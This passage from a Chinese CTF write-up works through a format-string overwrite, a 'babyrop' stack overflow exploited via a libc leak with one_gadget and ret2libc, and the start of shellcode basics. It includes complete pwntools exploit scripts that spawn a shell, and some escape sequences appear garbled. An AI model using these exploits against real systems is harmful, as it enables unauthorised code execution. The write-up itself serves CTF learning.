>
> ​ 0x41
同理offset2也是这样可以计算出来。
(3)覆盖过程
        payload = p32(ret) + p32(ret + 2) + "%" + str(buf_addr % 0x10000 + 0x28 - 8) + "d%4$hn"
        print("payload++:" + payload)
        print(len(payload))
        print(len(p32(ret) + p32(ret + 2)))
        payload += "%" + str((buf_addr >> 16) - (buf_addr % 0x10000) - 0x28) + "d%5$hn"
        payload = payload.ljust(0x28,'x00')
这个计算其实很有意思,`buf_addr % 0x10000`这个是取低地址2个字节,`$hn`是两字节覆盖
这里简单说下计算公式的由来:
0x28是因为想让shellcode在栈的0x28下方开始写入shellcode,-8是因为`p32(ret) + p32(ret + 2)`占了8字节
`buf_addr >> 16) - (buf_addr % 0x10000) - 0x28)`
这里要注意的是这种算法要保证:
`buf_addr`高位字节必须大于低位字节(默认都是大于的)
####  0x2.1 小总结
其实这个题目很多人做的话都是工具自动化的,我现在也没掌握如何实现自动化，后面为了提高效率我也会去学习这方面的内容，格式化字符串有点小坑就是,`%.d`和`%d`前面一个默认带一个小数点了多一字节,后面则没有,自己平时可以注意下。
###  0x3.2 babyrop
日常操作,上ida
这里很简单就是一个栈溢出修改v2的值,丢下我们计算过程:
    -0000000C-(-0000002C) = 0x20 这就是buf起始与v2起始的偏移
这样我们就可以绕过第一层然后进入`sub_804853D`
这里同样是栈溢出,但是程序没有相关的后门函数，这里我们可以控制eip然后`one_gadget`，但是我们前提是要先获取到程序的lib基地址。
这里我们可以`puts函数`来泄漏`__libc_start_main`的got表然后减去相对偏移就可以得到lib的基地址了
栈布置公式及其原理在第二篇文章已经说过了。
    payload = "a"*0x14+p32(elf.plt["puts"])+ p32(0x0804853D) + p32(elf.got['__libc_start_main'])
    sh.sendline(payload)
    lib_main = u32(sh.recv(4))
    libc = lib_main - lib.symbols['__libc_start_main']
    log.success("libc: " + hex(libc))
我们现在能控制eip和泄漏了libc
那么我们可以直接用`one_gadget`来获取或者在lib库里面寻找`system`和`/bin/sh`
`one_gadget`对于64位程序来说相当方便,因为前5个参数放在寄存器里面要找rop链
这里为了学习这种思想干脆两种方式都讲一下。
但是这里还有个问题,虽然我们重新回到了`0x0804853D`这个函数,但是这里有个`retaddr`的判断
> leave:
>
> mov ebp,esp
>
> pop ebp
>
> ret:
>
> 将esp的值pop,然后赋值给eip
这里我们可以采用ret指令来双重跳
这样子的话程序就可以过去那个判断然后进入了retn这个中转语句然后根据esp的值指向了我们的system
####  0x 3.1 one_gaget 利用
`one_gadget /lib/i386-linux-gnu/libc.so.6`
随便选择一个,执行失败的具体原因比较复杂,不能打通就换就行了
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    debug = True
    # 设置调试环境
    context.log_level = 'debug'
    context.arch = "i386"
    # 设置tmux程序
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    # 设置调试程序
    elf = ELF('./1910245db1406dc99ea')
    # 设置lib
    lib =  ELF("/lib/i386-linux-gnu/libc.so.6")
    """
    常见的获取lib.so里面的地址偏移
    libc_write=libc.symbols['write']
    libc_system=libc.symbols['system']
    libc_sh=libc.search('/bin/sh').next()
    """
    if debug:
        # 建立本地连接
        sh = process('./1910245db1406dc99ea')
    else:
        # 建立远程连接
        link = ''
        ip, port = map(strip,link.split(':'))
        sh = remote(ip, port)
    # attch 程序
    # gdb.attch(sh, "b functionn c")
    # print(hex(libc.symbols['puts']))
    # exit(0)
    # bypass one
    sh.recvuntil('n')
    payload = 'a'*0x20 + p32(1717986918)
    # gdb.attach(sh, 'b *0x0804853D')
    sh.sendline(payload)
    # leak_puts = elf.plt['puts']
    # print(leak_puts,)
    # pop_ret = 0x0804865b
    #
    sh.recvuntil('name?n')
    libc_start_main_got = elf.got['__libc_start_main']
    log.success("elf.plt['puts']:" + hex(elf.plt['puts']))
    log.success("elf.got[libc_start_main]:" + hex(elf.got['__libc_start_main']))
    payload = "a"*0x14+p32(elf.plt["puts"])+ p32(0x0804853D) + p32(elf.got['__libc_start_main'])
    sh.sendline(payload)
    lib_main = u32(sh.recv(4))
    libc = lib_main - lib.symbols['__libc_start_main']
    log.success("libc: " + hex(libc))
    oneShell = libc + 0x67a7f
    # 这里进行shell
    payload = "a"*0x14 + p32(0x08048433) + p32(oneShell) + p32(0)*50
    sh.sendafter("?n",payload)
    sh.interactive()
这里我测试了好多个,总算在`0x67a7f`找到个成功的了。
####  0x 3.2 常规构造
因为lib是开了pie的所以我们直接加上泄漏的基地址就能得到运行时的函数地址了
    system = libc + lib.symbols['system']
    binsh = libc +  lib.search("/bin/shx00").next()
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
exp.py
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    debug = True
    # 设置调试环境
    context.log_level = 'debug'
    context.arch = "i386"
    # 设置tmux程序
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    # 设置调试程序
    elf = ELF('./1910245db1406dc99ea')
    # 设置lib
    lib =  ELF("/lib/i386-linux-gnu/libc.so.6")
    """
    常见的获取lib.so里面的地址偏移
    libc_write=libc.symbols['write']
    libc_system=libc.symbols['system']
    libc_sh=libc.search('/bin/sh').next()
    """
    if debug:
        # 建立本地连接
        sh = process('./1910245db1406dc99ea')
    else:
        # 建立远程连接
        link = ''
        ip, port = map(strip,link.split(':'))
        sh = remote(ip, port)
    # attch 程序
    # gdb.attch(sh, "b functionn c")
    # print(hex(libc.symbols['puts']))
    # exit(0)
    # bypass one
    sh.recvuntil('n')
    payload = 'a'*0x20 + p32(1717986918)
    gdb.attach(sh, 'b *0x0804853D')
    sh.sendline(payload)
    # leak_puts = elf.plt['puts']
    # print(leak_puts,)
    # pop_ret = 0x0804865b
    #
    sh.recvuntil('name?n')
    libc_start_main_got = elf.got['__libc_start_main']
    log.success("elf.plt['puts']:" + hex(elf.plt['puts']))
    log.success("elf.got[libc_start_main]:" + hex(elf.got['__libc_start_main']))
    payload = "a"*0x14+p32(elf.plt["puts"])+ p32(0x0804853D) + p32(elf.got['__libc_start_main'])
    sh.sendline(payload)
    lib_main = u32(sh.recv(4))
    libc = lib_main - lib.symbols['__libc_start_main']
    log.success("libc: " + hex(libc))
    # 这里进行shell
    system = libc + lib.symbols['system']
    binsh = libc +  lib.search("/bin/shx00").next()
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    payload = "a"*0x14 + p32(0x08048433) + p32(system) + 'A'*4 + p32(binsh)
    sh.sendafter("?n",payload)
    sh.interactive()
####  0x 3.3 小总结
这个题目感觉很经典的栈溢出利用，这里需要理解的是栈溢出点只有一个，但是我们可以通过覆盖返回地址然后再执行多次，这里执行了两次，一次泄漏libc,第二次是利用。
###  0x3.3 EasyShellcode
这个题目涉及到shellcode的知识点,懂得可以略过。
这里分享下我的shellcode学习历程:
> 前置知识:
>
> 字长word size: 32位 64位程序的划分依据,cpu一次操作可以处理的二进制比特数
>
> 一个字长是8的cpu，一次能进行不大于1111,1111 (8位) 的运算
>
> 一个字长是16的cpu ，一次能进行不大于 1111,1111,1111,1111(16位)的运算
>
> **中断** 的概念:一个硬件或软件发出的请求，要求CPU暂停当前的工作去处理更加重要的事情。
>
> 程序可以通过系统提供的一套接口来访问系统资源，接口是通过 **中断** 来实现的
>
> **中断** 可以让cpu从用户态的特权级别切换到内核态的特权级别。
>
> **中断** 有两个属性分别为中断号与中断处理程序,中断号对应相应的中断程序。
>
> 所以说 64位shellcode在32位程序肯定是跑不起来的,shellcode必须和程序位数统一
>
> 也就是shellcode必须服从程序的位数。
>
> 两者的shellcode主要区别是:寄存器不一样了,导致指令就不一样了。
shellcode的基本构成:
通过汇编执行 execve(“/bin/sh”,0) 这个系统调用的中断处理程序, int 中断号 可以触发对应的中断处理程序
中断号从eax里面获取。
(ps.需要的注意是shellcode不能有/x00字符的出现 也就是说清零操作不能直接mov eax,0 而是xor eax,eax)
>
>     global_start
>     _start:
>     mov eax,1
>     mov ebx,0
>     xor eax,eax
>  
​ 1.`nasm -f elf32 t.asm`
​ 2.`ld -m elf_i386 -o t t.o`
​ 3.`objdump -d t`
可以看到mov 指令因为不满32位会填充x00的字符的而xor是没有的。
> shellcode的获取方式:
>
> pwntools:
>
> 
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    debug = False
    # 设置调试环境
    context.log_level = 'debug'
    # context.arch = "i386"
    t32 = shellcraft.i386.linux.sh()
    t64 = shellcraft.amd64.linux.sh()
    print(t32)
    print(t64)
    # print(asm(t32))
    # print(asm(t64))
套路第一步: